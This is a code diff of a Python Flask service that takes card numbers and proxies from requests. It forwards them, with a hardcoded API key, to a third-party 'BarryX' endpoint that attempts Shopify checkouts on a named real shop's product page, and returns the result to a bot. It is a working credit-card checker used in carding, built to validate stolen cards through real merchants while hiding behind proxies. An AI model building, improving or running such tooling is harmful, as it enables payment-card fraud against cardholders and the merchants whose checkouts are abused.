@@ -3,7 +3,6 @@ import requests
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
-
 BARRYX_API = "https://api.barryxapi.xyz/shopify_graphql"
 API_KEY    = "BRY-KESNP-TUPWH-JFOT9"
 
@@ -11,28 +10,20 @@ API_KEY    = "BRY-KESNP-TUPWH-JFOT9"
 def check():
     cc    = request.args.get("cc")
     proxy = request.args.get("proxy", "")
-    # Default product URL – you can change this to any Shopify product
-    site = "https://shop.wedsociety.com/products/2026-wed-society®-indianapolis-book-of-weddings-digital-issue"
+    site  = "https://shop.wedsociety.com/products/2026-wed-society®-indianapolis-book-of-weddings-digital-issue"
 
-    payload = {
-        "key": API_KEY,
-        "card": cc,
-        "product_url": site,
-        "proxy": proxy
-    }
+    payload = {"key": API_KEY, "card": cc, "product_url": site, "proxy": proxy}
     try:
         resp = requests.post(BARRYX_API, json=payload, timeout=30)
         data = resp.json()
-        # Map BarryX response to bot's expected fields
         return jsonify({
             "Response": data.get("message", "Unknown"),
             "Price": data.get("price", "-"),
             "Gate": data.get("gateway", "Shopify")
         })
     except Exception as e:
-        # If BarryX fails, return a clear error – your bot will show it
         return jsonify({
-            "Response": f"API error: {str(e)[:100]}",
+            "Response": f"Error: {str(e)[:100]}",
             "Price": "-",
             "Gate": "Shopify"
         })
